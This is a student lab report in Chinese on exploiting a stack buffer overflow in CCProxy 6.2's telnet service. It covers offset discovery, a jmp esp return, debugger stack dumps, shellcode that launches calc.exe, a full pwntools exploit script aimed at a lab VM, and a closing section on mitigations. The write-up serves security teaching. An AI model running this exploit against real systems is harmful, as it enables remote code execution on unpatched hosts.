## <center>CCproxy缓冲区溢出漏洞实验报告</center>
#### <center> 贺佳 202518000807081 </center>

### 一、 缓冲区溢出漏洞的原理

在调用函数时，将会先压入返回地址到栈中(一般为`call`指令的下一条指令的地址)，然后压入旧的`ebp`，开始执行这个函数；当执行完该函数时，将会把返回地址弹出到寄存器`eip`中，从而让控制流恢复到原函数处继续进行程序。

如果程序中使用了一些不安全的函数，例如`gets`,`strcpy`等，对用户的输入不加限制的读取，读取数据的长度一旦超过预期的长度，就会造成缓冲区溢出。对于栈溢出而言，将会首先覆盖栈上存取的旧`ebp`，进而覆盖返回地址，而一旦我们能控制返回地址，就可以劫持到任意函数或shell处进行命令执行。

一般来说，控制返回地址后有若干种攻击手段，主要有`ret2fnc`,`ret2shell`与`ret2libc`等。`ret2fnc`指的是源程序中本身就存在一些后门函数，通过简单的覆盖返回地址到后面函数的代码段地址处即可完成栈溢出攻击；`ret2shell`一般则是在栈上写入一段任意脚本执行的命令，通过覆盖返回地址重新回到栈上进行shell执行；`ret2libc`利用稍微复杂一些，它是利用C语言的动态链接库函数地址偏移固定，比如说通过一些方式泄露出`puts`函数的真实地址，通过相对偏移就能确定`system`函数与`/bin/sh`的地址，从而达到任意命令执行的目的。

在针对CCproxy程序的缓冲区溢出漏洞攻击中，我们使用的是`ret2shell`的攻击手段。

### 二、 CCproxy的栈溢出漏洞攻击
1. 实验准备：本次实验使用的靶机为Windows XP虚拟机，攻击机为Ubuntu虚拟机，CCproxy版本为6.2，靶机使用NAT模式与主机共享ip地址，地址为`192.168.254.130`，telnet连接开放端口为23。

2. 测试漏洞存在：使用x32dbg挂载CCproxy运行。使用以下代码生成一串长度为2000的花字符串并发送，观察程序错误时的eip寄存器的值，此时这个值就是因为栈溢出覆盖的错误的返回地址。如图所示，对应的字符串为`h7Bh`(注意小端序)。再通过查找确定偏移量为1012，也就是说返回地址位于1013字节到1016字节，据此我们可以完成程序进程劫持了。
<center><img src='./1.png'></center>

```python
def pattern_create(length):
    charset1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    charset2 = "abcdefghijklmnopqrstuvwxyz"
    charset3 = "0123456789"

    pattern = ""
    for ch1 in charset1:
        for ch2 in charset2:
            for ch3 in charset3:
                if len(pattern) >= length:
                    return pattern[:length]
                pattern += ch1 + ch2 + ch3
    return pattern[:length]
print(pattern_create(2000))

pat = 'h7Bh'
index = s.find(pattern_create(2000))  # 1012 
print(index)
```

3. 栈布局研究
一般来说，一个函数的栈由寄存器`esp`与`ebp`控制。`esp`标记着栈现在执行到了哪个位置，也就是说，可以通过控制`esp`来保证我们的程序跳转到栈上的shellcode附近完成攻击。因此我们需要找一条`jmp esp`的指令。如图所示：<center><img src='./2.png'></center>
这样的指令很大，但是需要注意构造payload时最好不要出现`\x00`这样的截止符以及退格符等，这里我选取的指令地址为`0x77d29353`，由于程序没有开地址随机化保护，因此每次程序运行时此处地址固定，我们不用担心下次运行时这里的指令发生变化。我在此处下了一个断点用于观察栈的布局。
首先构造第一个payload：`b"ping "+(b'\x90'*20+shell).ljust(1012, b'\x90') + jmp_esp + b'\n'`。先暂且不去管前面的`\x90`与`shell`。我们先来看看此时栈上的情况：<center><img src='./3.png'></center>
程序预期地在`0x77d29353`地址处停下，我们步进，程序跳转到了`0x13b6700`处，正是寄存器`esp`的值。这样我们确实成功的让执行流到了栈上(需要注意的是栈的地址每次可能出现不同，但后三位一定相同的，在这里溢出后，返回地址的地址为`6f0`，esp则指向`700`，中间有16个字节之差)。我们此时来看看栈的布局：
```
013B66F0   77D29353  user32.77D29353
013B66F4   00000A0D  
013B66F8   013B7B44  
013B66FC   000001D4  
013B6700   000001D4  
013B6704   676E6970  
013B6708   74736F48  
013B670C   746F6E20  
013B6710   756F6620  
013B6714   203A646E  
013B6718   90909090  
013B671C   90909090  
013B6720   90909090  
013B6724   90909090  
013B6728   90909090  
013B672C   33EC8B55  
013B6730   505050C0  
013B6734   4DF445C6  
013B6738   53F545C6  
013B673C   56F645C6  
013B6740   43F745C6  
013B6744   52F845C6  
013B6748   54F945C6  
013B674C   2EFA45C6  
013B6750   44FB45C6  
013B6754   4CFC45C6  
013B6758   4CFD45C6  
013B675C   801D7BBA  
013B6760   458D527C  
013B6764   55FF50F4  
013B6768   EC8B55F0  
013B676C   B82CEC83  
013B6770   636C6163  
013B6774   33F44589  
013B6778   F84589C0  
013B677C   50F4458D  
013B6780   BF93C7B8  
013B6784   90D0FF77  
```
首先返回地址上面的1012字节就是我们的`(b'\x90'*20+shell).ljust(1012, b'\x90')`这一段数据，不必再提。返回地址下面保存着一些局部变量的信息：`704`到`714`这一段对应的信息其实是` ping Host not found:`，之后则是我们的payload的所有信息。此外还多了`\r\n`在payload结尾。

现在的问题是我要运行的shellcode是那一部分的shellcode，栈中的shell在`esp`上方，局部变量的shell又被前面的局部变量隔断了，按理来说我们应该在返回地址之下再布置shell。但是这个程序有一些不一样的地方，继续往下看。现在构造第二段payload：`b"ping "+(b'\x90'*20+shell).ljust(1012, b'\x90') + jmp_esp + b'a'*9 + b'\n'`，我们着重看payload之前的那段局部变量：
```
013B66F0   77D29353  user32.77D29353
013F66F4   61616161  
013F66F8   61616161  
013F66FC   72509090  
013F6700   2079786F  
013F6704   6E6C6554  
013F6708   433E7465  
013F670C   6F725043  
013F6710   54207978  
013F6714   656E6C65  
013F6718   65532074  
013F671C   63697672  
013F6720   65522065  
013F6724   2E796461  
013F6728   43430A0D  
013F672C   786F7250  
013F6730   65542079  
013F6734   74656E6C  
013F6738   480A0D3E  
013F673C   2074736F  
013F6740   20746F6E  
013F6744   6E756F66  
013F6748   90203A64  
```
返回地址之后先如实覆盖了8个`a`，但是后面的`a`却不见了，同时局部变量似乎多了一些东西：去除`\x90`可以看到对应的文本内容为：
```
Proxy Telnet>CCProxy Telnet Service Ready.
CCProxy Telnet>
Host not found:
```
与之前相比，多了一串欢迎语，但是前面的`CC`却被`\x90`覆盖了，这里的`\x90`是哪里来的，我们多溢出一点看看。构造payload3:`b"ping "+(b'\x90'*20+shell).ljust(1012, b'\x90') + jmp_esp + b'a'*40+b'\n'`。
```
012B66F0   77D29353  user32.77D29353
012B66F4   61616161  
012B66F8   61616161  
012B66FC   90909090  
012B6700   90909090  
012B6704   90909090  
012B6708   90909090  
012B670C   90909090  
012B6710   33EC8B55  
012B6714   505050C0  
012B6718   4DF445C6  

012B671C   636976C6  
012B6720   65522065  
012B6724   2E796461  
012B6728   43430A0D  
012B672C   786F7250  
012B6730   65542079  
012B6734   74656E6C  
012B6738   480A0D3E  
012B673C   2074736F  
012B6740   20746F6E  
012B6744   6E756F66  
012B6748   90203A64  
```
对比我们写的shell可以发现，除去溢出的8个`a`外，此时篡改了
```
CCProxy Telnet>CCProxy Telnet Service Ready.
CCProxy Telnet>
```
前33个字节为我们payload的前33个字节，也就是说payload2发送过去之后，第一个字节`\x90`代替了`C`。那这样，如果按我们的预期的话通过在后面增添足够的字节，就会把我们的payload覆写进返回地址下的这一片区域，只要把shellcode写出来就够了。现在可以来正式构造一个该方法下最短的payload：
`
payload  = b"ping "+(b'\x90'*4+shell).ljust(1012, b'\x90') + jmp_esp + b'\x90'*(11+len(shell)) + b'\n'
`
首先需要在shell的开头填补4个`\x90`，因为溢出是在`6f0`处，但是`esp`是指向`700`，中间空缺了12个字节，在末尾填补8个`\x90`之后，就需要payload前面的四个字节`\x90`再填充，保证shell恰好在`700`处执行。后面为了保证溢出长度足够写到code，所有先考虑8个正常溢出，再考虑4个覆写溢出，除去一个换行符，因此11即可。注意，由于我们这里精确控制了写入shellcode的位置到跳转的`esp`处，事实上这段payload中的`\x90`可以改为任意字节，我们不需要用它作为滑梯到我们想要的shellcode位置。并且这是此种方法下最短的payload。

有没有别的方法？当然有，shellcode都能写入恶意命令，那么控制`esp`的值也不在话下。我们既然已经有一段shellcode位于栈中，只需要把`esp`指过去就好了。这里我们就不精确控制了。比如说我们把shellcode放在1012的末尾，然后让`esp`减去一定值后跳转过去，做一个滑滑梯执行shellcode即可。因此我这里写了两段shell，一段是恶意命令的shell，一段是用来控制`esp`的shell，记为shell2：
```
shell2
\x83\xec\x6c  sub esp,0x6c;
\xff\xe4      jmp esp;
```
构造payload如下：`payload2 = b"ping "+(b'\x90'*4+shell2).ljust(1012-len(shell), b'\x90') + shell + jmp_esp + b'a'*(11+len(shell2)) + b'\n'`

我们来看看此时栈布局：
```
013F6694 | 90                       | nop                                     |
013F6695 | 55                       | push ebp                                |
013F6696 | 8BEC                     | mov ebp,esp                             |
013F6698 | 33C0                     | xor eax,eax                             |
013F669A | 50                       | push eax                                |
013F669B | 50                       | push eax                                |
013F669C | 50                       | push eax                                |
013F669D | C645 F4 4D               | mov byte ptr ss:[ebp-C],4D              | 4D:'M'
013F66A1 | C645 F5 53               | mov byte ptr ss:[ebp-B],53              | 53:'S'
013F66A5 | C645 F6 56               | mov byte ptr ss:[ebp-A],56              | 56:'V'
013F66A9 | C645 F7 43               | mov byte ptr ss:[ebp-9],43              | 43:'C'
013F66AD | C645 F8 52               | mov byte ptr ss:[ebp-8],52              | 52:'R'
013F66B1 | C645 F9 54               | mov byte ptr ss:[ebp-7],54              | 54:'T'
013F66B5 | C645 FA 2E               | mov byte ptr ss:[ebp-6],2E              | 2E:'.'
013F66B9 | C645 FB 44               | mov byte ptr ss:[ebp-5],44              | 44:'D'
013F66BD | C645 FC 4C               | mov byte ptr ss:[ebp-4],4C              | 4C:'L'
013F66C1 | C645 FD 4C               | mov byte ptr ss:[ebp-3],4C              | 4C:'L'
013F66C5 | BA 7B1D807C              | mov edx,<kernel32.LoadLibraryA>         |
013F66CA | 52                       | push edx                                |
013F66CB | 8D45 F4                  | lea eax,dword ptr ss:[ebp-C]            |
013F66CE | 50                       | push eax                                |
013F66CF | FF55 F0                  | call dword ptr ss:[ebp-10]              |
013F66D2 | 55                       | push ebp                                |
013F66D3 | 8BEC                     | mov ebp,esp                             |
013F66D5 | 83EC 2C                  | sub esp,2C                              |
013F66D8 | B8 63616C63              | mov eax,636C6163                        |
013F66DD | 8945 F4                  | mov dword ptr ss:[ebp-C],eax            |
013F66E0 | 33C0                     | xor eax,eax                             |
013F66E2 | 8945 F8                  | mov dword ptr ss:[ebp-8],eax            |
013F66E5 | 8D45 F4                  | lea eax,dword ptr ss:[ebp-C]            |
013F66E8 | 50                       | push eax                                |
013F66E9 | B8 C793BF77              | mov eax,<msvcrt.system>                 |
013F66EE | FFD0                     | call eax                                |
013F66F0 | 53                       | push ebx                                |
013F66F1 | 93                       | xchg ebx,eax                            |
013F66F2 | D277 61                  | shl byte ptr ds:[edi+61],cl             |
013F66F5 | 61                       | popad                                   |
013F66F6 | 61                       | popad                                   |
013F66F7 | 61                       | popad                                   |
013F66F8 | 61                       | popad                                   |
013F66F9 | 61                       | popad                                   |
013F66FA | 61                       | popad                                   |
013F66FB | 61                       | popad                                   |
013F66FC | 90                       | nop                                     |
013F66FD | 90                       | nop                                     |
013F66FE | 90                       | nop                                     |
013F66FF | 90                       | nop                                     |
013F6700 | 83EC 6C                  | sub esp,6C                              |
013F6703 | FFE4                     | jmp esp                                 |
```
我们可以观察，首先返回地址覆盖后`esp`值为`700`,减去`6c`后即为`694`，程序随即执行`jmp esp`跳转至该地址，经过一个`nop`后开始执行shell。那么为什么不直接返回至`695`处开始执行？这里依据我的调试，必须保证`esp`的值在`push ebp`压栈时是4的整数倍，也就是说，必须使得`esp`减去4的整数倍(`700`本身是倍数)，也即`0x6c`,`0x70`等等，如果直接减去`0x6b`等非4整数倍会导致shell执行失败。这一个payload较上一个payload短了很多。我预计还可以让`esp`加一点，在栈的局部变量处执行shell，这里我没有构造了。

攻击成功后，可以看到弹出一个计算器：<center><img src='./4.png'></center>

### 三、攻击代码
利用pwntools对远程主机进行连接攻击：
```python
from pwn import *

context(arch='i386',log_level='debug')
io = remote("192.168.254.130", 23)

shell = (b"\x55\x8B\xEC\x33\xC0\x50\x50\x50\xC6\x45\xF4\x4D\xC6\x45\xF5\x53"
		b"\xC6\x45\xF6\x56\xC6\x45\xF7\x43\xC6\x45\xF8\x52\xC6\x45\xF9\x54\xC6\x45\xFA\x2E\xC6"
		b"\x45\xFB\x44\xC6\x45\xFC\x4C\xC6\x45\xFD\x4C\xBA"
		b"\x7b\x1d\x80\x7c"
		b"\x52\x8D\x45\xF4\x50"
		b"\xFF\x55\xF0"
		b"\x55\x8B\xEC\x83\xEC\x2C\xB8\x63\x61\x6C\x63\x89\x45\xF4\x33\xC0\x89\x45\xF8"
		b"\x8D\x45\xF4"
		b"\x50\xB8"
		b"\xc7\x93\xbf\x77"
		b"\xFF\xD0")
shell2 = b'\x83\xec\x74\xff\xe4' # sub esp,0x74 ; jmp esp

offset = 1012
jmp_esp = 0x77D29353  

payload = [b"ping "+(b'\x90'*20+shell).ljust(offset, b'\x90') + p32(jmp_esp) + b'a'*200+b'\n',
b"ping "+(b'\x90'*4+shell2).ljust(offset-len(shell), b'\x90') + shell + p32(jmp_esp) + 
b'a'*(11+len(shell2)) + b'\n']

io.recv()
io.send(payload[0]) # payload列表中的都可以
io.close()
```
payload的构造原理可以见第二部分的具体分析,不再赘述。pwntools是CTF中用来接近解决pwn题的常用工具。

### 四、遇到的困难

1. 漏洞具体成因：因为始终没有找到函数内部的汇编，我推测应该是在strcpy()的时候导致的栈溢出。但是我还未明白返回地址后溢出8字节以上突然多了一串欢迎语，并且重新用payload进行覆写是怎么来的。

2. 栈对齐：在使用第二种方法构造payload时，因为没有注意栈对齐调试了很久。单步过汇编时发现各寄存器变化都是按预期进行，但是就是无法成功，最后定位到对齐问题上成功shell。

### 五、漏洞防范
1. 对用户自己：不要使用一些危险函数，严格限制用户输入。事实上现在C语言标准库似乎已经把`gets`删了，用`fgets`代替。

2. 开启各种保护，我知道的有Canary保护，栈不可执行保护，地址随机化，got表绑定。
- Canary保护：在溢出后有四个校验字节(32位程序)，如果想覆盖返回地址一定会覆盖这四个字节，系统检查后判定溢出导致攻击失败。一般来说，对于Canary保护，可以利用格式化字符串漏洞读取校验字节，从而溢出时保证校验字节不变，或者直接利用格式化字符串漏洞完成任意写而不是溢出。
- 栈不可执行：栈上的代码只会作为数据，而不当成指令执行。不仅是栈上，理论上应该限制任意区域不能同时拥有可写与可执行权限。
- 地址随机化：地址随机化时，每次程序运行是都使用随机基址，对于这道题而言如果使用随机基址，我们就找不到`jmp esp`了。但是一般来说，即使地址随机化，地址后三位是保持不变的，地址相对偏移也是固定的，因此可以考虑泄露出某段代码的真实地址，通过偏移确定所有地址。
- got表绑定：如果got表可写，使用的库函数可能被攻击者篡改成一些危险后门函数。因此可以通过绑定got表，让got表不可写。